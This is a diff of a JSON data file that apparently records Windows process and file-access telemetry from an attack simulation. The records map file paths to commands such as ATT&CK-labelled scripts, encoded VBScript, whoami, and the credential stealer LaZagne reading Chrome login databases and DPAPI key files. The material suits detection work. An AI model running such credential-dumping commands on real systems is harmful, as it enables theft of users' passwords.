-        "filename": "  C:/Users/Administrator/Desktop/shell/\\\nT1059.003_script.bat\"",
+        "filename": "  C:/Users/Administrator/Desktop/shell/T1059.003_script.bat\"",
         "cmd": "C:/WINDOWS/system32/cmd.exe /c   C:/Users/Administrator/Desktop/shell/T1059.003_script.bat",
         "id": "65b6784bf0b757d8dda52d2b7c38db9e",
         "key": "0ed65d25430bb2c8f030144ba8b45875"
@@ -714,13 +714,13 @@
         "key": "99f4460b5ba35d5900c4bcf81e3696d1"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/fhwdixby/CSC6CAA6AA7A0DE43F3812D4EDDDF7BD98.TMP\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/fhwdixby/CSC6CAA6AA7A0DE43F3812D4EDDDF7BD98.TMP\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/fhwdixby/fhwdixby.cmdline",
         "id": "8de52a0399d5f21a4554f7c8fd4be229",
         "key": "cf0b488dd4f11d5be1cf951c1905ea39"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nRESC646.tmp\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/RESC646.tmp\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESC646.tmp   c:/Users/Administrator/AppData/Local/Temp/fhwdixby/CSC6CAA6AA7A0DE43F3812D4EDDDF7BD98.TMP",
         "id": "3c3ef21fee15d93d2d83ac6d288b04f8",
         "key": "739efe2cbbda908e22e2751216eacaae"
@@ -732,7 +732,7 @@
         "key": "e1c3fe5c5c0bb5a14bcf3b7ee6c11108"
     },
     {
-        "filename": "  C:/Users/Administrator/Desktop/shell/\\\nT1059.007.vbs\"",
+        "filename": "  C:/Users/Administrator/Desktop/shell/T1059.007.vbs\"",
         "cmd": "cscript.exe   /e:VBScript.Encode T1059.007.vbs",
         "id": "6aa4b847eacd92f5e2c681a0d3c54a03",
         "key": "ec3b9cb6fda3c0a888af3b0cd47aa1f1"
@@ -775,54 +775,54 @@
     },
     {
         "filename": "  C:/WINDOWS/Prefetch/WHOAMI.EXE-9D378AFE.pf\"",
-        "cmd": "\" C:/WINDOWS/system32/whoami.exe \"",
+        "cmd": "C:/WINDOWS/system32/whoami.exe",
         "id": "30d138bc1a86ec2f75cf69c770a5f2b4",
         "key": "04b0d7dc0b91fa4a82f63906ec52c981"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/lbfowsgp/lbfowsgp.0.cs\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/lbfowsgp/lbfowsgp.0.cs\"",
         "cmd": "powershell",
         "id": "5408eff07b0a3aad30b46c484e5235b2",
         "key": "02995db1db982845cdcc3bfd78764386"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/lbfowsgp/lbfowsgp.out\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/lbfowsgp/lbfowsgp.out\"",
         "cmd": "powershell",
         "id": "5408eff07b0a3aad30b46c484e5235b2",
         "key": "1b302caa00ffd956d1d63e51a38918dc"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_24gkiyey.joq.psm1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_24gkiyey.joq.psm1\"",
         "cmd": "powershell",
         "id": "5408eff07b0a3aad30b46c484e5235b2",
         "key": "59e56ba29e53f2fdaa87d547ca84d5ca"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/lbfowsgp/lbfowsgp.dll\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/lbfowsgp/lbfowsgp.dll\"",
         "cmd": "powershell",
         "id": "5408eff07b0a3aad30b46c484e5235b2",
         "key": "82fac4fe498178556749de81fcf3bdb3"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/lbfowsgp/lbfowsgp.cmdline\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/lbfowsgp/lbfowsgp.cmdline\"",
         "cmd": "powershell",
         "id": "5408eff07b0a3aad30b46c484e5235b2",
         "key": "c196d4f9c6c7fbbd0e6f82b5c0847d90"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_lu4fk0i0.zuh.ps1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_lu4fk0i0.zuh.ps1\"",
         "cmd": "powershell",
         "id": "5408eff07b0a3aad30b46c484e5235b2",
         "key": "ec6d7d16e3266bc0fbe4f968bf4f9e3a"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/lbfowsgp/CSC5C7822791F754E7486A439DAA52914D.TMP\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/lbfowsgp/CSC5C7822791F754E7486A439DAA52914D.TMP\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/lbfowsgp/lbfowsgp.cmdline",
         "id": "5932abe52fabb99ec8b4fb8ee3e92aa4",
         "key": "dd00485aadee85d063734235a91ca336"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nRESA911.tmp\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/RESA911.tmp\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESA911.tmp   c:/Users/Administrator/AppData/Local/Temp/lbfowsgp/CSC5C7822791F754E7486A439DAA52914D.TMP",
         "id": "aeaddb88ea0df0a2fc129891fa59706b",
         "key": "eebfd52641cfd2c19b3ef37748394ef3"
@@ -834,73 +834,73 @@
         "key": "a1594b3ebbf4001ebc2544996756dd82"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/rj51a2aa/CSC69987A1E891048F297459D71D0A9C759.TMP\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/rj51a2aa/CSC69987A1E891048F297459D71D0A9C759.TMP\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/rj51a2aa/rj51a2aa.cmdline",
         "id": "b9d4e7f18ee3bf58c00b886bce06c1e7",
         "key": "6a003cc8ad180e027a670545edfc123f"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nRESA568.tmp\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/RESA568.tmp\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESA568.tmp   c:/Users/Administrator/AppData/Local/Temp/rj51a2aa/CSC69987A1E891048F297459D71D0A9C759.TMP",
         "id": "084aa9b4eee6ba098e9c41f9c0f70864",
         "key": "8053d106e492f2cdb69bf4248e06a486"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_xso0zeyt.01b.psm1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_xso0zeyt.01b.psm1\"",
         "cmd": "powershell",
         "id": "219d2dd9d2ee376588c24c26a711a6af",
         "key": "14b2cb9e47ef3ed309794fc1120faac2"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/oztnp4xi/oztnp4xi.dll\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/oztnp4xi/oztnp4xi.dll\"",
         "cmd": "powershell",
         "id": "219d2dd9d2ee376588c24c26a711a6af",
         "key": "763c8f86d439a7c86c2dff442a3025d5"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/oztnp4xi/oztnp4xi.0.cs\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/oztnp4xi/oztnp4xi.0.cs\"",
         "cmd": "powershell",
         "id": "219d2dd9d2ee376588c24c26a711a6af",
         "key": "bd436695334ed6486b418feb3fcc81c2"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_aygqssxa.qvg.ps1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_aygqssxa.qvg.ps1\"",
         "cmd": "powershell",
         "id": "219d2dd9d2ee376588c24c26a711a6af",
         "key": "f0c13077dbda0c2645221d8dfaa95a0c"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/oztnp4xi/oztnp4xi.cmdline\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/oztnp4xi/oztnp4xi.cmdline\"",
         "cmd": "powershell",
         "id": "219d2dd9d2ee376588c24c26a711a6af",
         "key": "f826fe9157a5cc1494d4f4e916979fe7"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/oztnp4xi/oztnp4xi.out\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/oztnp4xi/oztnp4xi.out\"",
         "cmd": "powershell",
         "id": "219d2dd9d2ee376588c24c26a711a6af",
         "key": "ff1c60960c970a19304b0b2ec4f523a8"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/oztnp4xi/CSC2E1569416EFF4A7B814A818C1E193C.TMP\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/oztnp4xi/CSC2E1569416EFF4A7B814A818C1E193C.TMP\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/oztnp4xi/oztnp4xi.cmdline",
         "id": "99eedf0076ac1a6f94aebdbb81ea45f9",
         "key": "15aaefd6d7bebab2c1498c47e10fd96b"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nRESF9F0.tmp\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/RESF9F0.tmp\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESF9F0.tmp   c:/Users/Administrator/AppData/Local/Temp/oztnp4xi/CSC2E1569416EFF4A7B814A818C1E193C.TMP",
         "id": "c0d8d8234b4036793960fd97cfcee27e",
         "key": "ec65455b06cd541c1b395407f0f0424f"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/b1oyrudp/CSC66C299FECC14DEFBFB5E77107D6CAE.TMP\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/b1oyrudp/CSC66C299FECC14DEFBFB5E77107D6CAE.TMP\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/b1oyrudp/b1oyrudp.cmdline",
         "id": "a5679c643be3c5219e9fcd09266480dd",
         "key": "662b48144e958bfc9c5a4bc58ada9785"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nRESF666.tmp\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/RESF666.tmp\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESF666.tmp   c:/Users/Administrator/AppData/Local/Temp/b1oyrudp/CSC66C299FECC14DEFBFB5E77107D6CAE.TMP",
         "id": "8ac931e5618a6200e6557ae769b21c1d",
         "key": "dd57b929690746f6b603621ad810c41a"
@@ -918,19 +918,19 @@
         "key": "105b28bfc60b14d26088b68c7c5642bd"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/kv5u34xf/CSC843437488743C18614B83C6BFAB629.TMP\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/kv5u34xf/CSC843437488743C18614B83C6BFAB629.TMP\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/kv5u34xf/kv5u34xf.cmdline",
         "id": "0abc3227fdf5033b0487dbe27132203d",
         "key": "808595a7b3c7a2728d586fb6b4d17c96"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nRES971B.tmp\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/RES971B.tmp\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES971B.tmp   c:/Users/Administrator/AppData/Local/Temp/kv5u34xf/CSC843437488743C18614B83C6BFAB629.TMP",
         "id": "fe97fdb55cc2e2ca244e97c5a0c2445a",
         "key": "6449668191a1d4c9a172bc5a2749733e"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/python27.dll\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/python27.dll\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "0c660f83746b4481f499d76621153f76"
@@ -942,181 +942,181 @@
         "key": "0c6ac015f6278f0e33175d41aa782a04"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/unicodedata.pyd\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/unicodedata.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "1fdb8d1e7b1528f7ec6fde1fbde4813b"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/pywintypes27.dll\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/pywintypes27.dll\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "2d1ac3c685a809d393c86f79b847bb6a"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/bz2.pyd\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/bz2.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "34c80c78af038faf960e47db65f3dd76"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/sqlite3.dll\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/sqlite3.dll\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "3ca1df349935ce8bcf3e3fc1fcd48ce4"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/msvcr100.dll\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/msvcr100.dll\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "3d0473684e706cdf8a951f4336097506"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/_socket.pyd\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/_socket.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "64ed9de83bf6819af6275d670a4ba751"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/_hashlib.pyd\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/_hashlib.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "666494460f9c7416fcde7af0359f352a"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/_multiprocessing.pyd\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/_multiprocessing.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "68fe6ed2e62ea7452c705c94d9a472e1"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/win32pipe.pyd\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/win32pipe.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "6ee195feaafb77afa9efd9bef258c132"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/_elementtree.pyd\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/_elementtree.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "9b7e582ef24cf003b1ff1a72070ba352"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/_ctypes.pyd\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/_ctypes.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "9d6f8adc4491de510147bd1acc5038ab"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/msvcp100.dll\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/msvcp100.dll\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "9f8885f2d3048b79f80cb4b798fa5b74"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/select.pyd\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/select.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "bbe1e74eadcf68bd4b10d60dca941102"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/pyexpat.pyd\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/pyexpat.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "c8fd38edb18cbe165e8a3a717d2adca1"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/MSVCR90.dll\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/MSVCR90.dll\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "e2b5764af68608649614ba1407284184"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/_ssl.pyd\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/_ssl.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "e6c4b5411908daeb0c58133d1dc6c203"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/lazagne.exe.manifest\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/lazagne.exe.manifest\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "f9979cdfe83cf67a616c06c2b0ebd6bc"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_\\\nMEI73082/_sqlite3.pyd\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/_MEI73082/_sqlite3.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
         "key": "fc44936a285c3abc1fa1c4da03e3bffd"
     },
     {
-        "filename": "  C:/users/admini~1/appdata/local/temp/\\\n84xcj8\"",
+        "filename": "  C:/users/admini~1/appdata/local/temp/84xcj8\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "1e713535098e53a953c436b682ff8b5e"
     },
     {
-        "filename": "  C:/users/admini~1/appdata/local/temp/\\\nsdfqjxdib\"",
+        "filename": "  C:/users/admini~1/appdata/local/temp/sdfqjxdib\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "254c490effa991a93b4dbe508bfcc8f0"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nGoogle/Chrome/User Data/Default/Login Data For Account-journal\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Google/Chrome/User Data/Default/Login Data For Account-journal\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "3a615b5b2acf7363d7ac57f1528df393"
     },
     {
-        "filename": "  C:/users/admini~1/appdata/local/temp/\\\nnncktffkx\"",
+        "filename": "  C:/users/admini~1/appdata/local/temp/nncktffkx\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "43401702acabcc2b9f73744f5bb16122"
     },
     {
-        "filename": "  C:/Users/cloudbase-init/AppData/Roaming/\\\nMicrosoft/Protect/CREDHIST\"",
+        "filename": "  C:/Users/cloudbase-init/AppData/Roaming/Microsoft/Protect/CREDHIST\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "5b2604782cc8c219438b0cf51416ec8c"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nGoogle/Chrome/User Data/Default/Login Data For Account\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Google/Chrome/User Data/Default/Login Data For Account\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "5c1757df81b3fa20a5ac4cf36407b3db"
     },
     {
-        "filename": "  C:/Users/cloudbase-init/AppData/Roaming/\\\nMicrosoft/Protect/S-1-5-21-2860491236-3051596471-1450068755-1002/8d55890d-29e6-4b5c-801d-517674309394\"",
+        "filename": "  C:/Users/cloudbase-init/AppData/Roaming/Microsoft/Protect/S-1-5-21-2860491236-3051596471-1450068755-1002/8d55890d-29e6-4b5c-801d-517674309394\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "5db4b61f80b3568f21c80ae1abed642e"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nGoogle/Chrome/User Data/Local State\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Google/Chrome/User Data/Local State\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "64d92a80d43094f1a4a5c9cdedb9b66a"
     },
     {
-        "filename": "  C:/users/admini~1/appdata/local/temp/\\\njylocdjph\"",
+        "filename": "  C:/users/admini~1/appdata/local/temp/jylocdjph\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "6d1331a500c75947ae9c788aa703ef3e"
     },
     {
-        "filename": "  C:/Users/cloudbase-init/AppData/Roaming/\\\nMicrosoft/Protect/S-1-5-21-2860491236-3051596471-1450068755-1002/Preferred\"",
+        "filename": "  C:/Users/cloudbase-init/AppData/Roaming/Microsoft/Protect/S-1-5-21-2860491236-3051596471-1450068755-1002/Preferred\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "9356f85b84fcd13f9908f99f40339498"
     },
     {
-        "filename": "  C:/Users/cloudbase-init/AppData/Roaming/\\\nMicrosoft/Protect/S-1-5-21-2860491236-3051596471-1450068755-1002/5e0d9103-574a-49bc-9ef1-2bb7d9799417\"",
+        "filename": "  C:/Users/cloudbase-init/AppData/Roaming/Microsoft/Protect/S-1-5-21-2860491236-3051596471-1450068755-1002/5e0d9103-574a-49bc-9ef1-2bb7d9799417\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "ad94059ad98845c6664e7bacf934115f"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nGoogle/Chrome/User Data/Default/Login Data\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Google/Chrome/User Data/Default/Login Data\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "b450919b4616f7a8c07695e86aea3e1f"
@@ -1128,85 +1128,85 @@
         "key": "c19451f8d00c7d6bf19092f259617dd4"
     },
     {
-        "filename": "  C:/users/admini~1/appdata/local/temp/\\\ntjbvkjpetfjp\"",
+        "filename": "  C:/users/admini~1/appdata/local/temp/tjbvkjpetfjp\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "e8562dbc60e2c48797b52dee0cb8d790"
     },
     {
-        "filename": "  C:/users/admini~1/appdata/local/temp/\\\nqsdirkg\"",
+        "filename": "  C:/users/admini~1/appdata/local/temp/qsdirkg\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "f7d0dca73033b0d33cb88462e77759ca"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/_\\\nelementtree.pyd\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/_elementtree.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "19bc03a7910dd8db7d4dfb4a5972f882"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/\\\nbz2.pyd\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/bz2.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "1fd23dd98a7181e83fc0deff400fac69"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/\\\npython27.dll\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/python27.dll\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "318ddc4e48ff63530567bf61ba4b543a"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/_\\\nsocket.pyd\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/_socket.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "36d884e62406ca5d6ac5c6867c9fd333"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/_\\\nsqlite3.pyd\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/_sqlite3.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "4b6b268c69ebeaf13985227b927f4ea5"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/\\\npyexpat.pyd\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/pyexpat.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "63ec7b46e82ea02c82d2768acc271eda"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/\\\nsqlite3.dll\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/sqlite3.dll\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "6528c09ea5801a0ba40994ee1dda950c"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/_\\\nmultiprocessing.pyd\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/_multiprocessing.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "7814be6eaa530412f617e8884bdf8e9f"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/_\\\nssl.pyd\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/_ssl.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
